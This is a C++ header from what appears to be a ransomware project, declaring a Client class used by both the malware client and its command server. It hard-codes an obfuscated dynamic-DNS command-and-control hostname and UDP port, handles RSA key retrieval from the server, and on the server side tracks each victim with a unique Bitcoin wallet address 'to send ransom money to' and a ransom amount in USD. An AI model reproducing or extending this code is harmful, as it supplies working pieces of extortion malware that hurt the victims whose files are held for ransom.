#ifndef _CLIENT_H_
#define _CLIENT_H_

#include "framework.h"
#include "net_types.h"
#include "obfuscate.h"
#include "net_common.h"

#include "External/base64.h"

#include <memory>
#include <algorithm>
#include <random>
#include <openssl/bio.h>

#pragma comment( lib, "ws2_32.lib" )

const unsigned int UDP_PORT = 5454;
const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));

class Client {
public:

    Server        TCPServerDetails = {};
    Server        UDPServerDetails = {};
    SOCKET        UDPSocket = INVALID_SOCKET;
    SOCKET        TCPSocket = INVALID_SOCKET;
    BIO*          RSAPublicKey;
    sockaddr_in   AddressInfo;

// Client only methods
#ifdef CLIENT_RELEASE
    Client();
    ~Client();

	BOOL          Connect(); // Connect to the tcp server
    BOOL          Disconnect(); // Disconnect from the tcp server
    BOOL          SendMessageToServer(Server dest, ClientMessage message);
    BOOL          SendEncryptedMessageToServer(Server dest, ClientMessage message);
    BOOL          SocketReady(SocketTypes type) const; // Check if TCP or UDP socket (depending on 'type') are not invalid
    
    template <typename _Ty>
    BOOL          ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr);
    BIO*          GetPublicRSAKeyFromServer();

// Server only client implementation
#elif defined(SERVER_RELEASE)
public:
    Client(SOCKET tcp, SOCKET udp, sockaddr_in addr) 
        : AddressInfo(addr), TCPSocket(tcp), UDPSocket(udp) 
    {
        std::random_device gen;
        std::mt19937 rng(gen());
        std::uniform_int_distribution<std::mt19937::result_type> dist(1, 10400);
        this->ClientUID = dist(rng);
    }
    long           ClientUID = -1;
    BIO*           RSAPrivateKey;
    std::string    UniqueBTCWalletAddress; // Wallet address to send ransom money to
    long           RansomAmountUSD;

    /*
        Implementation for event handling- to wait
        for a new message to be sent from a client.

        Server will be listening from each client that connects with a thread.
        When data is received, it will be inserted into ClientResponse if ExpectingResponse
        is set to true by a function. This allows us to make a WaitForClientResponse function
        that sets expecting response to true and consistantly checks recent client response
        against last client response, waiting for a new client response.
    */
    BOOL           ExpectingResponse; // Expecting a ClientResponse from a client not a clientREQUEST
    ClientResponse RecentClientResponse;
    ClientResponse LastClientResponse;
#endif
};


#endif